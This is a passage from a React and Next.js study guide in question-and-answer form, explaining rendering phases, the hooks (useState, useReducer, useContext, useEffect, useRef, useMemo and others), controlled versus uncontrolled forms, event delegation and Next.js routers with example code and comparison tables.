    **Commit Phase (React applying changes):**
    - React writes the calculated changes to the real DOM.
    - `useLayoutEffect` fires here — synchronously, before the browser paints.

    **Paint Phase (Browser's work):**
    - After the DOM is updated, the browser runs its rendering pipeline:
      `Style → Layout (Reflow) → Paint → Composite`
    - Pixels are drawn to the screen.
    - `useEffect` fires **after** this — asynchronously, non-blocking.

    **Full pipeline:**
    ```
    Component function runs     ← Render phase (React)
           ↓
    Virtual DOM diffed / reconciled
           ↓
    Real DOM updated            ← Commit phase (React)
           ↓
    useLayoutEffect fires       ← synchronous, blocks paint
           ↓
    Browser: Layout → Paint → Composite
           ↓
    useEffect fires             ← async, after pixels on screen
    ```

    **`useLayoutEffect` vs `useEffect`:**

    | Hook               | When it runs                    | Blocks paint? | Use case                                              |
    | ------------------ | ------------------------------- | ------------- | ----------------------------------------------------- |
    | `useLayoutEffect`  | After DOM update, before paint  | ✅ Yes        | Read/write DOM layout (e.g. `getBoundingClientRect`)  |
    | `useEffect`        | After paint (async)             | ❌ No         | Data fetching, subscriptions, timers                  |

    ```jsx
    import { useEffect, useLayoutEffect, useRef } from "react";

    function MeasureBox() {
      const ref = useRef();

      // Runs after DOM update, before browser paints — no layout flicker
      useLayoutEffect(() => {
        const width = ref.current.getBoundingClientRect().width;
        console.log("Width (before paint):", width);
      }, []);

      // Runs after browser paints — safe for side effects
      useEffect(() => {
        console.log("After paint — fetch data here");
      }, []);

      return <div ref={ref}>Measure me</div>;
    }
    ```

    **Key distinctions:**
    - A React **re-render** ≠ a browser **repaint**. If reconciliation produces no DOM changes, the browser does not repaint.
    - React re-render = running the component function (cheap, in-memory).
    - Browser repaint = redrawing pixels (can be expensive with layout/reflow changes).
    - React **batches** DOM updates across multiple state changes to minimize repaints.

---

### Hooks & Performance

1. What is the difference between `useMemo`, `useCallback`, and `React.memo`?
    - `useMemo`: Memoizes a **calculated value**.
    - `useCallback`: Memoizes a **function** reference.
    - `React.memo`: Memoizes a **whole component** to avoid re-renders.

    <img width="1268" height="475" alt="image" src="https://github.com/user-attachments/assets/b78c9190-2d18-4b5d-be26-7881d1e09a5f" />

    **`useCallback` Example:**
    ```jsx
    import React, { useState, useCallback } from "react";

    function Child({ onAdd }) {
      console.log("Child re-rendered");
      return <button onClick={onAdd}>Add</button>;
    }

    export default function Parent() {
      const [count, setCount] = useState(0);
      const [theme, setTheme] = useState("light");

      // ✅ Using useCallback prevents unnecessary re-creations of this function
      const handleAdd = useCallback(() => {
        setCount((prev) => prev + 1);
      }, []);

      return (
        <div>
          <h2>Count: {count}</h2>
          <Child onAdd={handleAdd} />
          <button onClick={() => setTheme(theme === "light" ? "dark" : "light")}>
            Toggle Theme
          </button>
        </div>
      );
    }
    ```

    **`useMemo` Example:**
    ```jsx
    import React, { useState, useMemo } from "react";

    export default function ProductList({ products }) {
      const [search, setSearch] = useState("");

      // ✅ useMemo prevents re-running this heavy filter on every render
      const filteredProducts = useMemo(() => {
        console.log("Filtering products...");
        return products.filter((p) =>
          p.name.toLowerCase().includes(search.toLowerCase())
        );
      }, [search, products]);

      return (
        <div>
          <input
            placeholder="Search..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
          <ul>
            {filteredProducts.map((p) => (
              <li key={p.id}>{p.name}</li>
            ))}
          </ul>
        </div>
      );
    }
    ```

1. Tree Shaking
    - Tree shaking = removing unused code from your bundle. Used by bundlers like Webpack, Rollup, and Vite.
    ```js
    // math.js
    export const add = (a, b) => a + b;
    export const sub = (a, b) => a - b;

    // app.js — only `add` is imported, so `sub` is removed from the bundle
    import { add } from "./math";
    add(2, 3);
    ```

1. Lazy Loading
    - Load components only when needed. Improves performance by reducing the initial bundle size.

1. Why do we need to build React?
    - React code cannot run directly in browsers efficiently. JSX needs compilation (Babel), code needs minification and tree shaking (Webpack/Vite), and modern JS must be transpiled for older browsers.

    | Feature        | 🧪 Development Mode             | 🚀 Production Build                          |
    | -------------- | ------------------------------- | -------------------------------------------- |
    | JSX Conversion | Converted instantly (in memory) | Converted during build                       |
    | Performance    | Not optimized                   | Highly optimized                             |
    | Minification   | ❌ No                           | ✅ Yes                                       |
    | Tree Shaking   | ❌ No                           | ✅ Yes (removes unused code)                 |
    | Bundling       | Minimal / on-demand             | Fully bundled & code-split                   |
    | Debugging      | ✅ Warnings, error overlays     | ❌ No debugging info                         |
    | Source Maps    | ✅ Enabled                      | ⚠️ Optional / often disabled                 |
    | Fast Refresh   | ✅ HMR enabled                  | ❌ No HMR                                    |
    | Build Output   | Stored in memory                | Physical optimized files (dist/build folder) |

---

### React Hooks

1. How do you update objects inside state?
   - You cannot update objects in state directly. JavaScript objects are mutable, but treat them as read-only inside state. Always create a fresh copy using spread syntax and pass it to the setter.

   **Wrong — direct mutation (UI won't update):**
   ```jsx
   function handleFirstNameChange(e) {
     user.firstName = e.target.value; // ❌ mutates directly, no re-render
   }
   ```

   **Correct — spread and update in one handler:**
   ```jsx
   function handleProfileChange(e) {
     setUser({
       ...user,
       [e.target.name]: e.target.value, // ✅ new object
     });
   }
   ```

1. How do you update nested objects inside state?
   - Spread syntax is **shallow** (copies only one level). For nested objects, create a new copy at each level of nesting.

   ```jsx
   // user = { name: "John", address: { country: "Singapore", postalCode: 440004 } }

   // ❌ Direct mutation — same reference, won't re-render
   user.address.country = "Germany";

   // ✅ Spread at each level
   setUser({
     ...user,
     address: {
       ...user.address,
       country: "Germany",
     },
   });
   ```

   For deeply nested structures, consider Immer to simplify updates.

1. How do you update arrays inside state?
   - Arrays are mutable in JavaScript, but treat them as immutable in state. Avoid mutation methods (`push`, `pop`, `splice`, `sort`, `reverse`) — use immutable alternatives.

   **Wrong:**
   ```jsx
   todos.push({ id: id + 1, name }); // ❌ mutates original
   ```

   **Correct:**
   ```jsx
   setTodos([...todos, { id: id + 1, name }]); // ✅ new array
   ```

   | Action | Preferred (immutable) | Non-preferred (mutates) |
   | --- | --- | --- |
   | Adding | `concat`, `[...arr, item]` | `push`, `unshift` |
   | Removing | `filter`, `slice` | `pop`, `shift`, `splice` |
   | Replacing | `map` | `splice`, `arr[i] = val` |
   | Sorting | copy first, then sort | `reverse`, `sort` |

1. How do you use the Immer library for state updates?
   - **Immer** uses a copy-on-write proxy. You write mutation syntax on a `draft`, and Immer produces a new immutable state automatically.

   ```bash
   npm install use-immer
   ```

   ```jsx
   import { useImmer } from "use-immer";

   const [user, setUser] = useImmer({
     name: "John",
     address: { country: "Singapore", postalCode: 440004 },
   });

   setUser((draft) => {
     draft.address.country = "Germany"; // ✅ mutation syntax is fine on draft
   });
   ```

   With Immer, all array methods (`push`, `splice`, `sort`) work safely on the draft.

1. What are the benefits of preventing direct state mutations?
   - React detects changes by **reference comparison** — mutating an object gives the same reference, so React skips the re-render.
   - Enables **time-travel debugging** — each state version is a distinct snapshot.
   - Concurrent rendering reads state multiple times during a render; mutations can produce inconsistent snapshots.
   - Keeps component behavior **predictable** and side-effect free.

1. Can `useState` take a function as an initial value?
   - Yes — called **lazy initialization**. Pass a function (not an invocation) so the expensive logic runs only once on mount, not on every render.

   ```jsx
   // ❌ Runs on every render
   const [count, setCount] = useState(expensiveComputation());

   // ✅ Runs only once
   const [count, setCount] = useState(() => expensiveComputation());
   ```

1. What types of values can `useState` hold?
   - Any JavaScript value: primitives (`number`, `string`, `boolean`), `null`, `undefined`, arrays, objects, and functions.
   - Be careful with **reference types** — React compares by reference, so direct mutations won't trigger re-renders:

   ```jsx
   user.name = "Sudheer"; // ❌ same reference, no re-render
   setUser(prev => ({ ...prev, name: "Sudheer" })); // ✅
   ```

1. What happens if you call `useState` conditionally?
   - React relies on the **fixed call order** of hooks to match them to internal slots. Conditional calls break that order and throw a runtime error.

   ```jsx
   if (someCondition) {
     const [state, setState] = useState(0); // ❌ breaks rules of hooks
   }
   ```

   Always call hooks at the **top level** of a component, unconditionally.

1. Can Hooks be used inside class components?
   - No. Hooks are exclusively for **functional components** (and custom hooks). They rely on a predictable call-order within a functional render that class components don't provide. Both component types can coexist in the same app.

1. What will happen if you define nested function components?
   - React treats a component defined inside another as a **new component type** on every render, causing full unmount/remount, loss of child state, and performance issues.

   ```jsx
   // ❌ New type on every render
   function Parent() {
     function Child() { return <div>Child</div>; }
     return <Child />;
   }

   // ✅ Define outside
   function Child() { return <div>Child</div>; }
   function Parent() { return <Child />; }
   ```

1. Can I use keys for non-list items?
   - Yes. Changing a `key` forces React to **unmount and remount** the component, resetting all its state — without prop drilling.

   ```jsx
   // Changing userId resets the entire form's state
   <ProfileForm key={userId} />
   ```

   Useful for resetting forms, re-triggering animations, or clearing child state.

1. What are the guidelines for writing reducers?
   - **Reducers must be pure** — same inputs always return the same output. No API calls, no timers, no side effects. They run during rendering.
   - **One action per user interaction** — even if it causes multiple state changes, use one descriptive action (`"reset_form"`) rather than one per field. This keeps the action log readable and debugging straightforward.

1. What is `useReducer` and why use it?
   - `useReducer` manages complex state logic by dispatching **actions** to a reducer function that returns new state, similar to Redux.

   ```jsx
   const [state, dispatch] = useReducer(reducer, initialState);
   ```

   Use `useReducer` when:
   - State is complex (nested, multi-field, or interdependent values)
   - Update logic should live outside the component (separate and testable)
   - You need undo/redo, multi-step forms, shopping cart, or toggle-heavy logic

1. How does `useReducer` work? Explain with an example.
   ```jsx
   function counterReducer(state, action) {
     switch (action.type) {
       case "increment": return { count: state.count + 1 };
       case "decrement": return { count: state.count - 1 };
       case "reset":     return { count: 0 };
       default:          return state;
     }
   }

   function Counter() {
     const [state, dispatch] = useReducer(counterReducer, { count: 0 });
     return (
       <>
         <h2>Count: {state.count}</h2>
         <button onClick={() => dispatch({ type: "increment" })}>+</button>
         <button onClick={() => dispatch({ type: "decrement" })}>-</button>
         <button onClick={() => dispatch({ type: "reset" })}>Reset</button>
       </>
     );
   }
   ```

   After each dispatch, React re-renders with the new `state.count`.

1. How is `useReducer` different from `useState`?

   | Feature | `useState` | `useReducer` |
   | --- | --- | --- |
   | State complexity | Simple / flat | Complex / multi-part / nested |
   | Update style | Direct (`setState(x)`) | Through actions (`dispatch({})`) |
   | Logic location | In component | In reducer function |
   | Reusability | Less reusable | Highly reusable and testable |

1. Can you combine `useReducer` with `useContext`?
   - Yes — this is the standard pattern for lightweight global state (Redux-lite) without external libraries.

   ```jsx
   const AppContext = React.createContext();

   function AppProvider({ children }) {
     const [state, dispatch] = useReducer(reducer, initialState);
     return (
       <AppContext.Provider value={{ state, dispatch }}>
         {children}
       </AppContext.Provider>
     );
   }
   ```

   Any component inside `AppProvider` reads state and dispatches actions via `useContext(AppContext)`.

1. Can you dispatch multiple actions in a row with `useReducer`?
   - Yes — call `dispatch` multiple times. React batches the renders but processes each action through the reducer individually.

   ```jsx
   dispatch({ type: "increment" });
   dispatch({ type: "increment" });
   dispatch({ type: "reset" });
   ```

   For multiple changes in one shot, define a composite action type:

   ```jsx
   case "increment_twice":
     return { count: state.count + 2 };
   ```

1. Is `dispatch` from `useReducer` asynchronous? Does it update state immediately?
   - `dispatch` is **synchronous** — the reducer runs immediately. However, the **state variable does not update within the same render cycle**, similar to `useState`. The new value is only available after the next render.

   ```jsx
   dispatch({ type: "increment" });
   console.log(state.count); // ❗ still old value
   ```

   To read the updated value after dispatch, use `useEffect`:

   ```jsx
   useEffect(() => {
     console.log("Updated:", state.count);
   }, [state.count]);
   ```

   Multiple dispatches in one event handler result in a **single re-render**.

1. What is `useContext` and what are the steps to use it?
   - `useContext` reads a context value inside a functional component without `<Context.Consumer>`. It eliminates prop drilling for shared data like themes, auth status, or user preferences.

   **Step 1 — Create:**
   ```jsx
   export const ThemeContext = createContext(); // optional default value
   ```

   **Step 2 — Provide:**
   ```jsx
   <ThemeContext.Provider value="dark">
     <MyComponent />
   </ThemeContext.Provider>
   ```

   **Step 3 — Consume:**
   ```jsx
   const theme = useContext(ThemeContext); // "dark"
   ```

1. What are the use cases of the `useContext` hook?
   - **Theme customization** — light/dark mode across the app
   - **Localization / i18n** — translated strings to all components
   - **User authentication** — sharing login status and user data globally
   - **Shared UI state** — modal/sidebar visibility controlled from anywhere
   - **Global state with `useReducer`** — lightweight Redux replacement

1. How does `useContext` work? Explain with an authentication example.
   ```jsx
   // AuthContext.js
   const AuthContext = createContext();
   export function AuthProvider({ children }) {
     const [user, setUser] = useState(null);
     const login  = (name) => setUser({ name });
     const logout = () => setUser(null);
     return <AuthContext.Provider value={{ user, login, logout }}>{children}</AuthContext.Provider>;
   }
   export const useAuth = () => useContext(AuthContext);
   ```

   ```jsx
   // HomePage.js
   const { user, login } = useAuth();
   return user ? <p>Welcome {user.name}</p> : <button onClick={() => login("Alice")}>Login</button>;
   ```

   ```jsx
   // Dashboard.js
   const { user, logout } = useAuth();
   if (!user) return <p>Please login.</p>;
   return <><p>Logged in as: {user.name}</p><button onClick={logout}>Logout</button></>;
   ```

1. Can you use multiple contexts in one component?
   - Yes — call `useContext` once for each context and nest their providers.

   ```jsx
   const theme = useContext(ThemeContext);
   const user  = useContext(UserContext);
   ```

   ```jsx
   <ThemeContext.Provider value="dark">
     <UserContext.Provider value={{ name: "Sudheer" }}>
       <Dashboard />
     </UserContext.Provider>
   </ThemeContext.Provider>
   ```

1. What is a common pitfall when using `useContext` with objects?
   - Passing a new object literal as the context value creates a **new reference on every render**, causing all consumers to re-render even when data hasn't changed.

   ```jsx
   // ❌ New object every render → all consumers re-render
   <MyContext.Provider value={{ user, theme }}>

   // ✅ Fix 1 — memoize the value
   const value = useMemo(() => ({ user, theme }), [user, theme]);
   <MyContext.Provider value={value}>

   // ✅ Fix 2 — split into separate contexts for unrelated state
   <UserContext.Provider value={user}>
     <ThemeContext.Provider value={theme}>
   ```

1. What is the context value when no matching provider exists?
   - The **default value** passed to `createContext(defaultValue)` is returned.

   ```jsx
   const ThemeContext = createContext("light"); // fallback = "light"
   // No provider → theme === "light"
   ```

   If no default is provided (`createContext()`), the value is `undefined`. Treat missing providers as a bug.

1. How do reactive dependencies in the `useEffect` array affect its execution?

   | Dependency array | When effect runs |
   | --- | --- |
   | Omitted | After **every** render |
   | `[]` | Once — after the first render only |
   | `[a, b]` | After first render + whenever `a` or `b` changes |

   React uses **shallow comparison** (`!==`) on each dependency. Objects/functions need memoization to avoid spurious effect runs.

1. When and how often does React invoke the setup and cleanup functions in `useEffect`?
   - **Setup runs:** after mount, and after every render where a dependency changed.
   - **Cleanup runs:** before the next setup (when deps change) and on unmount.

   | Array | Lifecycle equivalent |
   | --- | --- |
   | `[]` | `componentDidMount` + `componentWillUnmount` |
   | `[dep]` | `componentDidUpdate` for that dep |
   | Omitted | After every render |

1. What happens if you return a Promise from `useEffect`?
   - React expects the return value to be either `undefined` or a **synchronous cleanup function**. A returned Promise is silently ignored and may produce warnings in Strict Mode.

   ```jsx
   // ❌ Wrong
   useEffect(async () => { await fetchData(); }, []);

   // ✅ Correct
   useEffect(() => {
     async function load() {
       const data = await fetch("/api").then(r => r.json());
       setData(data);
     }
     load();
   }, []);
   ```

1. Can you have multiple `useEffect` hooks in a single component?
   - Yes — and it is **recommended** to separate concerns into multiple effects.

   ```jsx
   useEffect(() => { /* fetch data */ }, [userId]);
   useEffect(() => { /* attach resize listener */ }, []);
   ```

   Each effect runs independently, making code easier to read and debug.

1. How do you prevent infinite loops with `useEffect`?
   - Infinite loops occur when an effect updates state listed in its own dependency array, triggering itself forever.

   ```jsx
   // ❌ Infinite loop
   useEffect(() => { setCount(count + 1); }, [count]);

   // ✅ Guard with condition
   useEffect(() => {
     if (count < 5) setCount(count + 1);
   }, [count]);
   ```

1. How do you handle cleanup in `useEffect`?
   - Return a cleanup function from the effect. It runs before the next effect execution and on unmount, preventing memory leaks and stale handlers.

   ```jsx
   // Event listener
   useEffect(() => {
     window.addEventListener("resize", handleResize);
     return () => window.removeEventListener("resize", handleResize);
   }, []);

   // Timer
   useEffect(() => {
     const id = setInterval(() => setCount(c => c + 1), 1000);
     return () => clearInterval(id);
   }, []);

   // Abort fetch
   useEffect(() => {
     const controller = new AbortController();
     fetch(url, { signal: controller.signal })
       .then(r => r.json()).then(setData)
       .catch(err => { if (err.name !== "AbortError") setError(err); });
     return () => controller.abort();
   }, [url]);
   ```

1. What are the use cases of `useLayoutEffect`?
   - Use when your effect must run **before the browser paints** to avoid visual flicker: reading DOM dimensions, applying synchronous styles, or integrating third-party DOM libraries.

   ```jsx
   useLayoutEffect(() => {
     const width = divRef.current.offsetWidth;
     if (width < 400) divRef.current.style.background = "blue"; // no flicker
   }, []);
   ```

   For everything else, prefer `useEffect`.

1. How does `useLayoutEffect` work during SSR?
   - It does not run on the server (no DOM). React warns when used in SSR environments. Use an isomorphic pattern:

   ```jsx
   const useIsomorphicLayoutEffect =
     typeof window !== "undefined" ? useLayoutEffect : useEffect;
   ```

1. What happens if you use `useLayoutEffect` for non-layout logic?
   - It delays the browser paint unnecessarily. Non-layout work (data fetching, analytics, logging) always belongs in `useEffect`, which runs *after* paint.

   ```jsx
   // ❌ Delays paint for a network request
   useLayoutEffect(() => { fetch("/log-page-view"); }, []);
   ```

1. How does `useLayoutEffect` cause layout thrashing?
   - Repeatedly reading then writing DOM properties inside `useLayoutEffect` forces the browser to recalculate layout (reflow) synchronously after each write, blocking the main thread.

   ```jsx
   useLayoutEffect(() => {
     const h = ref.current.offsetHeight; // read → reflow
     ref.current.style.height = h + 20 + "px"; // write
     const newH = ref.current.offsetHeight; // read again → another reflow ❌
   }, []);
   ```

   Fix: batch all reads first, then all writes.

1. How do you use `useRef` to access a DOM element?
   - Assign `useRef(null)` to a `ref` prop. The DOM node is available via `.current` after mount.

   ```jsx
   const inputRef = useRef(null);
   const handleFocus = () => inputRef.current.focus();

   return (
     <>
       <input ref={inputRef} type="text" />
       <button onClick={handleFocus}>Focus</button>
     </>
   );
   ```

1. Can you use `useRef` to persist values across renders?
   - Yes — `.current` persists across renders **without causing re-renders**. Useful for tracking render count, interval IDs, or previous values.

   ```jsx
   const renderCount = useRef(0);
   useEffect(() => {
     renderCount.current++;
     console.log("Renders:", renderCount.current);
   });
   ```

1. Can `useRef` store the previous value of state?
   - Yes — a common pattern for comparing current vs previous values:

   ```jsx
   const [count, setCount] = useState(0);
   const prevRef = useRef();

   useEffect(() => { prevRef.current = count; }, [count]);

   return <p>Current: {count} | Previous: {prevRef.current}</p>;
   ```

1. Is it possible to access a ref in the render method?
   - You can read `ref.current` during render, but DOM refs are `null` on the **first render** (element hasn't mounted yet). Always access DOM refs inside `useEffect` or event handlers.

   ```jsx
   const divRef = useRef(null);
   console.log(divRef.current); // null on initial render ❌
   return <div ref={divRef}>Hello</div>;
   ```

1. What are the common use cases of `useRef`?
   - Auto-focus an input on mount
   - Scroll to a specific element
   - Measure element dimensions (`offsetWidth`, `clientHeight`)
   - Control video/audio playback
   - Persist an interval ID or timer without causing re-renders
   - Integrate with non-React libraries (D3, jQuery)

1. What is `useImperativeHandle` and when should you use it?
   - `useImperativeHandle` (used with `forwardRef`) exposes **specific methods** from a child component to its parent via a ref, rather than exposing the raw DOM node.

   ```jsx
   const Dialog = forwardRef((props, ref) => {
     const [isOpen, setIsOpen] = useState(false);

     useImperativeHandle(ref, () => ({
       open:  () => setIsOpen(true),
       close: () => setIsOpen(false),
     }));

     return isOpen ? <div className="dialog">{props.children}</div> : null;
   });

   function Parent() {
     const dialogRef = useRef();
     return (
       <>
         <button onClick={() => dialogRef.current.open()}>Open</button>
         <Dialog ref={dialogRef} />
       </>
     );
   }
   ```

   Use for: modal open/close, custom input `focus`/`clear`/`validate`, scroll containers, reusable component libraries.

1. Can `useImperativeHandle` be used without `forwardRef`?
   - No. `useImperativeHandle` only works in combination with `forwardRef`. Without it, the parent has no ref to attach to a child function component.

1. How is `useMemo` different from `useCallback`?

   | Feature | `useMemo` | `useCallback` |
   | --- | --- | --- |
   | Returns | A computed **value** | A **function reference** |
   | Usage | `useMemo(() => compute(), [deps])` | `useCallback(() => fn(), [deps])` |
   | Primary use | Avoid expensive recalculations | Stable callback for child props |
   | Common scenario | Filtering, sorting, derived data | Preventing unnecessary child re-renders |

1. Does `useMemo` prevent child component re-renders?
   - Not by itself. `useMemo` memoizes a value. When paired with `React.memo` on a child, the child skips re-rendering if the memoized value's reference is unchanged.

   ```jsx
   const filteredList = useMemo(() => items.filter(i => i.active), [items]);
   return <List data={filteredList} />; // skips re-render when filteredList reference is same
   ```

1. What is `useCallback` and why is it used?
   - Returns a **memoized function reference** that only changes when dependencies change. Prevents child components from re-rendering because they received a new function reference on every parent render.

   ```jsx
   const handleClick = useCallback(() => {
     doSomething(id);
   }, [id]); // stable reference as long as id doesn't change
   ```

1. What is the `useId` hook and when should you use it?
   - `useId` (React 18+) generates a **stable unique ID** consistent across server and client renders, primarily for accessibility attributes.

   ```jsx
   function EmailField() {
     const id = useId();
     return (
       <>
         <label htmlFor={id}>Email:</label>
         <input id={id} type="email" />
       </>
     );
   }
   ```

   Use for `htmlFor`, `aria-describedby`, `aria-labelledby`. Do **not** use as a list `key` or CSS selector (IDs contain `:` characters).

1. What is the `useDeferredValue` hook?
   - Returns a **deferred version of a value** that lags behind the current value. Keeps the UI responsive while an expensive component re-renders in the background.

   ```jsx
   const [query, setQuery] = useState("");
   const deferredQuery = useDeferredValue(query);
   const isStale = query !== deferredQuery;

   return (
     <>
       <input value={query} onChange={e => setQuery(e.target.value)} />
       <div style={{ opacity: isStale ? 0.5 : 1 }}>
         <SearchResults query={deferredQuery} /> {/* re-renders with a delay */}
       </div>
     </>
   );
   ```

1. What is the `useTransition` hook and how does it differ from `useDeferredValue`?
   - `useTransition` marks a state update as **non-urgent** so the UI stays responsive during expensive re-renders. Returns `[isPending, startTransition]`.

   ```jsx
   const [isPending, startTransition] = useTransition();

   function selectTab(tab) {
     startTransition(() => setTab(tab)); // won't block typing
   }

   return isPending ? <Spinner /> : <TabContent tab={tab} />;
   ```

   | Feature | `useTransition` | `useDeferredValue` |
   | --- | --- | --- |
   | Controls | State updates (wraps `setState`) | Values (wraps a value) |
   | Use when | You control the state update | You receive a value from props/hooks |
   | Pending indicator | Built-in `isPending` | Must compare value manually |

1. What is the `useSyncExternalStore` hook?
   - Subscribes to an **external (non-React) data store** in a way safe for concurrent rendering, without tearing (reading inconsistent data across a single render).

   ```jsx
   function useOnlineStatus() {
     return useSyncExternalStore(
       (cb) => {
         window.addEventListener("online", cb);
         window.addEventListener("offline", cb);
         return () => { window.removeEventListener("online", cb); window.removeEventListener("offline", cb); };
       },
       () => navigator.onLine, // client snapshot
       () => true              // server snapshot
     );
   }
   ```

1. What is the `useInsertionEffect` hook?
   - For **CSS-in-JS library authors** only. Fires synchronously before DOM mutations — before `useLayoutEffect` and `useEffect` — to inject styles before any layout reads occur.

   ```jsx
   useInsertionEffect(() => {
     const style = document.createElement("style");
     style.textContent = ".btn { background: blue; }";
     document.head.appendChild(style);
   }, []);
   ```

   Not intended for application code.

1. What is the `useDebugValue` hook?
   - Displays a custom label for a custom hook in **React DevTools**. Use in shared library hooks to make debugging easier.

   ```jsx
   function useOnlineStatus() {
     const [isOnline, setIsOnline] = useState(true);
     useDebugValue(isOnline ? "Online" : "Offline");
     return isOnline;
   }
   ```

   Pass an optional formatter for expensive formatting (only runs when DevTools is open):

   ```jsx
   useDebugValue(user, u => u ? `User: ${u.name}` : "Loading...");
   ```

1. How do you share state logic between components using custom hooks?
   - Extract `useState`/`useEffect` logic into a function starting with `use`. Each component using the hook gets its **own isolated state** — the logic is shared, not the state itself.

   ```jsx
   function useLocalStorage(key, initialValue) {
     const [value, setValue] = useState(() => {
       try { return JSON.parse(localStorage.getItem(key)) ?? initialValue; }
       catch { return initialValue; }
     });

     useEffect(() => {
       localStorage.setItem(key, JSON.stringify(value));
     }, [key, value]);

     return [value, setValue];
   }

   // Both components have independent state backed by localStorage
   function ThemeToggle() {
     const [theme, setTheme] = useLocalStorage("theme", "light");
     return <button onClick={() => setTheme(t => t === "light" ? "dark" : "light")}>{theme}</button>;
   }
   ```

1. How does React Fiber work?
   - React Fiber is the core reconciliation engine (React 16+). It replaces the previous recursive call-stack approach with a **linked list of fiber nodes**, enabling interruptible, prioritized rendering.

   Each **fiber node** stores: component type, props, state, effects, and pointers to parent/child/sibling.

   | Phase | Description | Interruptible? |
   | --- | --- | --- |
   | Render (work-in-progress) | Builds new fiber tree, diffs against current tree | ✅ Yes |
   | Commit | Applies changes to real DOM, runs effects | ❌ No |

   - **Double buffering:** React keeps a *current* tree (on screen) and a *work-in-progress* tree (in memory). After work completes, they swap.
   - **Priority scheduling:** Urgent updates (clicks, input) are processed before background work (data prefetching) — the foundation of Concurrent Mode.

1. How does ReactJS work behind the scenes?
   - **Component rendering:** React executes your component function → registers hooks in order → builds a Virtual DOM tree (plain JS objects describing the desired UI).
   - **Reconciliation (diffing):** When state/props change, React re-runs the component and compares the new virtual DOM to the previous one using a fast diffing algorithm, computing the minimal set of real DOM changes.
   - **Commit phase:** React applies only the calculated changes to the real DOM, then runs `useEffect` / `useLayoutEffect` callbacks. This is the only time React touches the browser DOM.
   - **Fiber scheduler:** Breaks rendering into small units of work. Urgent tasks (user input) are prioritized over background work (data loading), keeping the UI responsive.
   - **Hooks state:** Each component has an internal hooks list. Hooks are identified by call order — re-renders run them in the same order to match slots, which is why hooks cannot be called conditionally.

1. What are the best practices for using React Hooks?
   - **Follow the Rules of Hooks:** only call hooks at the top level; only call from React functions or custom hooks.
   - **Use the ESLint plugin** (`eslint-plugin-react-hooks`) to catch violations automatically.
   - **Separate concerns** — one focused hook per responsibility instead of one large hook.
   - **Name custom hooks descriptively:** `useUserAuthentication`, `useFetchProducts`.
   - **List all dependencies accurately** — never suppress `exhaustive-deps` warnings without a clear reason.
   - **Memoize object/function dependencies** — inline objects and functions create new references every render, causing spurious effect runs. Use `useMemo`/`useCallback`.
   - **Always clean up** — return a cleanup function from `useEffect` for event listeners, timers, and subscriptions.

---

### Forms & Events

1. Controlled vs. Uncontrolled Components

    | Feature              | Controlled Component                | Uncontrolled Component             |
    | -------------------- | ----------------------------------- | ---------------------------------- |
    | Data source          | React state                         | DOM (`ref`)                        |
    | Value updated by     | `onChange` handler                  | User input (DOM)                   |
    | Validation           | Easy to validate within React       | Requires manual DOM access         |
    | Performance          | May re-render more often            | Fewer re-renders                   |
    | Use case             | Complex, dynamic, validated forms   | Simple, non-reactive forms         |
    | Example hooks        | `useState`, `useEffect`             | `useRef`                           |

    **Controlled Component** — React is the single source of truth for form data:
    ```jsx
    import { useState } from "react";

    function ControlledInput() {
      const [name, setName] = useState("");

      const handleSubmit = (e) => {
        e.preventDefault();
        alert(`Submitted name: ${name}`);
      };

      return (
        <form onSubmit={handleSubmit}>
          <input type="text" value={name} onChange={(e) => setName(e.target.value)} />
          <button type="submit">Submit</button>
        </form>
      );
    }
    ```

    **Uncontrolled Component** — DOM manages the data instead of React:
    ```jsx
    import { useRef } from "react";

    function UncontrolledInput() {
      const nameRef = useRef();

      const handleSubmit = (e) => {
        e.preventDefault();
        alert(`Submitted name: ${nameRef.current.value}`);
      };

      return (
        <form onSubmit={handleSubmit}>
          <input type="text" ref={nameRef} />
          <button type="submit">Submit</button>
        </form>
      );
    }
    ```

1. Event Delegation vs Event Handling

    - **Event Handling (Normal DOM Way):** Attaches event listeners directly to individual DOM elements. Simple, but inefficient for many elements.
    - **Event Delegation:** Attaches a single listener to a common ancestor and lets events bubble up.

    ```jsx
    {/* Delegation — one listener on <ul> handles all <li> clicks */}
    <ul onClick={handleItemClick}>
      <li>Item 1</li>
      <li>Item 2</li>
      <li>Item 3</li>
    </ul>
    ```

    | Aspect         | Event Handling                        | Event Delegation                          |
    | -------------- | ------------------------------------- | ----------------------------------------- |
    | Listeners      | One per element                       | One on common ancestor                    |
    | Memory         | Higher (many listeners)               | Lower (single listener)                   |
    | Dynamic nodes  | Must re-attach for new elements       | ✅ Works automatically                    |
    | Downside       | Memory-intensive at scale             | `event.target` needs extra checks         |

    **React's internal approach:** React attaches a single event listener at the root container rather than on each element — it uses event delegation by default.

---

### Next.js

1. What is Next.js and how is it different from React?
   - **React** is a UI library for building components — it handles rendering but leaves routing, data fetching, and SSR to you.
   - **Next.js** is a full-stack React framework built on top of React that provides these out of the box:

   | Feature | React (alone) | Next.js |
   | --- | --- | --- |
   | Routing | Manual (e.g., React Router) | File-system based (built-in) |
   | SSR / SSG / ISR | Not built-in | Native support |
   | API routes | Not built-in | Built-in (`/api` or route handlers) |
   | Code splitting | Manual | Automatic per page |
   | Image optimization | Not built-in | `<Image>` component |
   | SEO | Client-only by default | SSR/SSG enable better SEO |

1. When should you use client vs server components in Next.js?

   | Use **Client Components** when | Use **Server Components** when |
   | --- | --- |
   | Need interactivity / event listeners (`onClick`, `onChange`) | Fetching data from a database or API |
   | Using state (`useState`, `useReducer`) or lifecycle effects | Accessing backend resources directly |
   | Using browser-only APIs | Keeping sensitive info (API keys, tokens) on the server |
   | Custom hooks that depend on state/effects/browser APIs | Reducing client-side JavaScript bundle size |
   | React class components | Large dependencies that don't need to be on the client |

   Server components are the default in the App Router (`app/` directory). Add `"use client"` at the top to opt into a client component.

1. What are the differences between the Page Router and App Router in Next.js?

   | Feature | Page Router (`pages/`) | App Router (`app/`) |
   | --- | --- | --- |
   | Default component type | Client Components | Server Components |
   | Layouts | `_app.js` / `_document.js` | Native `layout.js` (nested) |
   | Data fetching | `getServerSideProps`, `getStaticProps` | `async/await` in Server Components |
   | Loading states | Manual | Built-in `loading.js` (Suspense) |
   | Error handling | `_error.js` | Built-in `error.js` at any level |
   | Streaming | Limited | Built-in (Suspense) |
   | Server Actions | Not available | Native support |
   | Metadata | `<Head>` component | `metadata` object / `generateMetadata` |

   **Page Router structure:**
   ```
   pages/
   ├── index.js          // /
   ├── about.js          // /about
   ├── _app.js
   └── posts/[id].js     // /posts/:id
   ```

